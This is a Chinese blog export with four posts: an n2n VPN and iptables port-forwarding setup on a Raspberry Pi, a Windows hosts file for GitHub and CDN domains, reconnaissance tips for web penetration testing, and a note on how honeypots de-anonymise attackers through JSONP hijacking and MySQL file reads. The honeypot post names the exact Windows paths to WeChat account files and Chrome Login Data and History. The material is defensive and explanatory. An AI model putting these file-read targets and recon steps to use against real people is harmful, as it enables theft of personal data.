    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	本着垃圾佬的原则，准备将家里吃灰的树莓派利用起来，所以准备openmediavault+n2n+frr实现任意地点访问屋里内网设备，但是frr老是学习不到内网设备，所以直接用iptables端口映射实现了</p>
<p>​	主要记录n2n以及iptables映射，优点是少量的内网设备无需使用复杂的frr，缺点是无法支持动态的ip映射以及过多的内网设备映射管理程度直线上升</p>
<p>参考网址：</p>
<p><a href="https://xyzbz.cn/archives/944/">树莓派4b安装OpenMediaVault</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1760345?policyId=1003">通过N2N组网并运行OSPF动态路由</a></p>
<p><a href="https://github.com/ntop/n2n">n2n开源地址</a></p>
<p><a href="https://github.com/happynclient/happynwindows">n2n-windows软件</a></p>
<p>注：OpenMediaVault安装docker的话需要注意自身网络考虑是否要换源</p>
<p><a href="https://www.bilibili.com/opus/1008600304150642709">OMV7.0部署及docker安装 - 哔哩哔哩</a></p>
<p><strong>建立n2n无需在意它在几层nat，只要能通网就成</strong></p>
<span id="more"></span>

<h1 id="1-实操记录"><a href="#1-实操记录" class="headerlink" title="1-实操记录"></a>1-实操记录</h1><p>目前运营商一般会有两层nat如下图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                   互联网 (云)</span><br><span class="line">                        │</span><br><span class="line">        ┌───────────────┼───────────────┐</span><br><span class="line">        │               │               │</span><br><span class="line">┌───────┴───────┐   ┌───┴───┐   ┌───────┴───────┐</span><br><span class="line">│ 运营商/NAT网关  │   │       │   │ 外网电脑       │</span><br><span class="line">│(分配路由器/光猫) │   │       │   │ (公网IP)      │</span><br><span class="line">└───────┬───────┘   │       │   │ 对等网:10.0.0.2│</span><br><span class="line">        │           │       │   └───────┬───────┘</span><br><span class="line">        │           │       │           │ (互联网访问)</span><br><span class="line">┌───────┴───────┐   │       │           │</span><br><span class="line">│    路由器      │   │       │           │</span><br><span class="line">│ 192.168.2.1   │   │       │           │</span><br><span class="line">└───────┬───────┘   │       │           │</span><br><span class="line">        │           │       │           │</span><br><span class="line">┌───────┴───────┐   │       │           │</span><br><span class="line">│   树莓派4B     │   │       │           │</span><br><span class="line">│192.168.2.x    │   │       │           │</span><br><span class="line">│对等网:10.0.0.1 │   │       │           │</span><br><span class="line">└───────────────┘   │       │           │</span><br><span class="line">            |       │       │           │</span><br><span class="line">            ┌───────┴───────┴───────┐   │</span><br><span class="line">            │   VPN隧道10.0.0.0/24   ├───┘</span><br><span class="line">            │ (例如: N2N/openVPN)    │</span><br><span class="line">            └───────────────────────┘</span><br></pre></td></tr></table></figure>

<p>安装相应依赖（编译安装出错了可以问ai缺乏了什么依赖）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y libcap-dev miniupnpc libssl-dev zlib1g-dev</span><br></pre></td></tr></table></figure>

<p>编译安装（版本为3.0）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>一个服务端的配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/n2n-supernode.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=N2N Supernode Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/sbin/supernode -p 0.0.0.0:&#123;port&#125; -f -v</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=3</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">#系统自启</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable n2n-supernode</span><br><span class="line">systemctl start n2n-supernode</span><br></pre></td></tr></table></figure>

<p>两个客户端的系统配置（只需要变化虚拟网卡的ip）：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#树莓派</span><br><span class="line">vim /etc/systemd/system/n2n-edge.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=N2N Edge Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/sbin/edge -c &#123;账号&#125; -k &#123;密码&#125; -a &#123;设定的虚拟网卡ip例如<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>和<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">2</span>&#125; -f -v -l &#123;公网ip:port&#125;</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">#系统自启</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable n2n-edge</span><br><span class="line">systemctl <span class="built_in">start</span> n2n-edge</span><br></pre></td></tr></table></figure>

<p>内网端口映射：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#启用 IP 转发</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#将 edge0 上到 <span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1010</span> 的流量转发到 <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">1</span>:<span class="number">80</span></span><br><span class="line">sudo iptables -t nat -A PREROUTING -i &#123;虚拟网卡&#125; -p tcp --dport <span class="number">1010</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">1</span>:<span class="number">80</span></span><br><span class="line"></span><br><span class="line">#保证返回流量能正确返回</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o &#123;内网网卡&#125; -p tcp --dport <span class="number">80</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">1</span> -j MASQUERADE</span><br><span class="line"></span><br><span class="line">！确保转发规则允许流量通过</span><br><span class="line">sudo iptables -A FORWARD -i &#123;虚拟网卡&#125; -o &#123;内网网卡&#125; -p tcp --dport <span class="number">80</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">1</span> -j ACCEPT</span><br><span class="line"></span><br><span class="line">！确保转发规则允许流量通过</span><br><span class="line">sudo iptables -A FORWARD -i &#123;内网网卡&#125; -o &#123;虚拟网卡&#125; -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>windows可以使用<a href="https://github.com/happynclient/happynwindows">n2n-windows软件</a>进行连接：<br><img src="/../image/n2n-iptables/1.png"></p>
<p>! 该方法可以使得所有输入同一服务ID和服务密钥的用户在同一局域网中<br>服务ID和服务密钥就是之前输入的账号和密码</p>
<h1 id="2-建议"><a href="#2-建议" class="headerlink" title="2-建议"></a>2-建议</h1><p>n2n太老了，建议用easytier或者zeroTier，这两个组网后连接快的多</p>
]]></content>
      <categories>
        <category>p2p</category>
      </categories>
      <tags>
        <tag>n2n</tag>
      </tags>
  </entry>
  <entry>
    <title>host-config</title>
    <url>/2025/09/02/host-config/</url>
    <content><![CDATA[<h1 id="0"><a href="#0" class="headerlink" title="0"></a>0</h1><p><em>C:\Windows\System32\drivers\etc\hosts</em></p>
<span id="more"></span>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># =====================</span><br><span class="line"># GitHub 加速</span><br><span class="line"># =====================</span><br><span class="line"><span class="number">140</span>.<span class="number">82</span>.<span class="number">113</span>.<span class="number">3</span> github.com</span><br><span class="line"><span class="number">140</span>.<span class="number">82</span>.<span class="number">114</span>.<span class="number">4</span> gist.github.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">108</span>.<span class="number">153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">109</span>.<span class="number">153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">110</span>.<span class="number">153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">111</span>.<span class="number">153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">151</span>.<span class="number">101</span>.<span class="number">1</span>.<span class="number">194</span> github.global.ssl.fastly.<span class="built_in">net</span></span><br><span class="line"><span class="number">151</span>.<span class="number">101</span>.<span class="number">65</span>.<span class="number">194</span> github.global.ssl.fastly.<span class="built_in">net</span></span><br><span class="line"><span class="number">151</span>.<span class="number">101</span>.<span class="number">129</span>.<span class="number">194</span> github.global.ssl.fastly.<span class="built_in">net</span></span><br><span class="line"><span class="number">151</span>.<span class="number">101</span>.<span class="number">193</span>.<span class="number">194</span> github.global.ssl.fastly.<span class="built_in">net</span></span><br><span class="line"><span class="number">140</span>.<span class="number">82</span>.<span class="number">112</span>.<span class="number">5</span> api.github.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">108</span>.<span class="number">133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">109</span>.<span class="number">133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">110</span>.<span class="number">133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">185</span>.<span class="number">199</span>.<span class="number">111</span>.<span class="number">133</span> raw.githubusercontent.com</span><br><span class="line"></span><br><span class="line"># =====================</span><br><span class="line"># Gitee 加速</span><br><span class="line"># =====================</span><br><span class="line"><span class="number">180</span>.<span class="number">97</span>.<span class="number">125</span>.<span class="number">228</span> gitee.com</span><br><span class="line"><span class="number">180</span>.<span class="number">97</span>.<span class="number">125</span>.<span class="number">228</span> www.gitee.com</span><br><span class="line"><span class="number">180</span>.<span class="number">97</span>.<span class="number">125</span>.<span class="number">228</span> oschina.<span class="built_in">net</span></span><br><span class="line"><span class="number">180</span>.<span class="number">97</span>.<span class="number">125</span>.<span class="number">228</span> www.oschina.<span class="built_in">net</span></span><br><span class="line"></span><br><span class="line"># =====================</span><br><span class="line"># 微信小程序加速</span><br><span class="line"># =====================</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> dldir1.qq.com       # 基础库下载主CDN</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> dldir1.qq.com</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> developers.weixin.qq.com</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> servicewechat.com</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> res.wx.qq.com</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> apis.map.qq.com     # 腾讯地图API</span><br><span class="line"></span><br><span class="line"># =====================</span><br><span class="line"># 通用前端开发CDN</span><br><span class="line"># =====================</span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> cdn.jsdelivr.<span class="built_in">net</span>    # 常用前端库CDN</span><br><span class="line"><span class="number">104</span>.<span class="number">16</span>.<span class="number">87</span>.<span class="number">35</span> cdnjs.cloudflare.com    # Cloudflare CDN</span><br><span class="line"><span class="number">151</span>.<span class="number">101</span>.<span class="number">1</span>.<span class="number">194</span> npmjs.org              # npm官方</span><br><span class="line"><span class="number">104</span>.<span class="number">16</span>.<span class="number">121</span>.<span class="number">35</span> registry.npmjs.org</span><br><span class="line"><span class="number">120</span>.<span class="number">232</span>.<span class="number">181</span>.<span class="number">106</span> registry.npmmirror.com # 淘宝npm镜像</span><br><span class="line"></span><br><span class="line"># =====================</span><br><span class="line"># 其他开发相关</span><br><span class="line"># =====================</span><br><span class="line"></span><br><span class="line"><span class="number">203</span>.<span class="number">205</span>.<span class="number">254</span>.<span class="number">157</span> unpkg.com           # 前端包CDN</span><br><span class="line"><span class="number">52</span>.<span class="number">85</span>.<span class="number">83</span>.<span class="number">101</span> fonts.googleapis.com    # Google字体</span><br><span class="line"><span class="number">52</span>.<span class="number">85</span>.<span class="number">83</span>.<span class="number">101</span> fonts.gstatic.com</span><br><span class="line"><span class="number">108</span>.<span class="number">157</span>.<span class="number">215</span>.<span class="number">70</span> ajax.googleapis.com</span><br><span class="line"></span><br><span class="line"><span class="number">47</span>.<span class="number">239</span>.<span class="number">169</span>.<span class="number">182</span> nslookup anyrouter.top   #claude code</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>host</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集思路</title>
    <url>/2024/12/20/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="信息搜集思路扩散"><a href="#信息搜集思路扩散" class="headerlink" title="信息搜集思路扩散"></a>信息搜集思路扩散</h1><p>​	1.ico图标搜集</p>
<p>​	2.icp备案号&#x2F;icp.name备案公司搜集</p>
<p>​	3.域名搜集———简写域名搜集&#x2F;子域名搜集</p>
<span id="more"></span>

<p>​	4.关键字搜寻-title&#x2F;body</p>
<p>​	5.中标公司，名下公司查询—涉及就查</p>
<p>​	6.证书查询</p>
<p>​	7.图片搜索—基本没用</p>
<p>​		1&gt;联合&#x2F;递归查询</p>
<p>​		2&gt;爆破域名查询——-针对空间测绘找不到的影子资产</p>
<p>​		3&gt;域名目录更改—–例如，ab.sb.com——&gt;ab.sb.com&#x2F;ab          目录爆破**</p>
<h1 id="找网址漏洞的信息搜集思路"><a href="#找网址漏洞的信息搜集思路" class="headerlink" title="找网址漏洞的信息搜集思路"></a>找网址漏洞的信息搜集思路</h1><p>​	1.要是信息搜集能力强于web渗透思路如下</p>
<p>​		1&gt;与其在网址上找漏洞不如，根据漏洞找对应网址</p>
<p>​	2.web渗透强于其他</p>
<p>​		2&gt;搜集边缘&#x2F;影子资产，从易到难</p>
<h1 id="根据公众号找web的思路"><a href="#根据公众号找web的思路" class="headerlink" title="根据公众号找web的思路"></a>根据公众号找web的思路</h1><p>​	1.找合作公司的公众号，找相关的功能web</p>
<p>​	2.找到公众号所有的web，根据域名找公司，根据公司找公众号，以此往复***</p>
<p>​	3.根据全称公众号，找下面的无关公众号点点，可能存在你要找的内容功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Information</tag>
        <tag>Official account</tag>
      </tags>
  </entry>
  <entry>
    <title>蜜罐怎么获取个人信息</title>
    <url>/2024/12/20/%E8%9C%9C%E7%BD%90%E8%8E%B7%E5%8F%96%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h3 id="蜜罐防守"><a href="#蜜罐防守" class="headerlink" title="蜜罐防守"></a>蜜罐防守</h3><p>​	蜜罐主要是通过web蜜罐和mysql蜜罐来获取个人信息</p>
<p>​	蜜罐通过模拟各种服务来获取个人信息，但也跟漏洞JSONP有关</p>
<p>​	蜜罐获取个人信息主要是依赖用户所注册的网址存在JSONP、XSS等信息泄露的漏洞</p>
<span id="more"></span>

<p><strong>JSONP漏洞与CSRF非常相似，但JSONP劫持只能获得js返回的敏感数据</strong></p>
<p><strong>JSONP劫持步骤：</strong></p>
<p>​	1.蜜罐被访问url</p>
<p>​	2.蜜罐返回包含回调函数的JS代码</p>
<p>​	3.访问网址B时-将回调函数作为参数请求</p>
<p>​	4.返回包含用户信息的JSON数据</p>
<p>​	5.上传用户信息数据到蜜罐</p>
<p><strong>读取微信号</strong></p>
<p>win系统下，读取手机号和微信ID的方法（默认常见微信文件路径）</p>
<p>我们可以下面的步骤来获取用户的微信号</p>
<p>1）通过C:&#x2F;Windows&#x2F;PFRO.log获取windows用户名</p>
<p>2）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;All Users&#x2F;config&#x2F;config.data获取wxid</p>
<p>3）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;wx_id&#x2F;config&#x2F;AccInfo.dat获取微信号、手机号</p>
<p><strong>读取chrome的登录数据</strong></p>
<p>读取chrome的login data，虽然无法解密出密码，但是还是可以获取到对方的一些账号</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;Login Data</p>
<p><strong>chrome的历史记录</strong></p>
<p>我们还可以读取chrome的历史记录</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;History</p>
<p>开源蜜罐系统hfish中的mysql蜜罐就利用了这种方式来获取攻击者的文件，如下首先在蜜罐中设置要读取的文件。</p>
<p><img src="/../image/Honeypot/%E8%9C%9C%E7%BD%90.png" alt="蜜罐"></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Cybersecurity</tag>
        <tag>Honeypot</tag>
        <tag>Information Gathering</tag>
        <tag>Intrusion Detection</tag>
        <tag>Attack Analysis</tag>
      </tags>
  </entry>
</search>
